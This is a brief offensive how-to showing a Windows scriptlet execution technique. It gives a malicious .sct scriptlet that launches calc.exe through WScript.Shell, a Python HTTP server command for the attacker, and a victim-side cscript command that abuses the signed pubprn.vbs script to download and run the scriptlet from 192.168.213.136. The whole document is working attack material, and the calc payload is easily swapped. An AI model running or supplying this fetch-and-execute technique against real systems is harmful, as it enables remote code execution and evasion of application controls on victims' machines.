# Attacker server
- Create malicious file (m.sct):
```xml
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"   
	>
</registration>

<script language="JScript">
<![CDATA[
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	
]]>
</script>

</scriptlet>
```
- Run listenning server:
```python
python3 -m http.server 80
```

# Victim machine
- Open cmd.exe and run the following command
```cmd
cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://192.168.213.136/m.sct
```
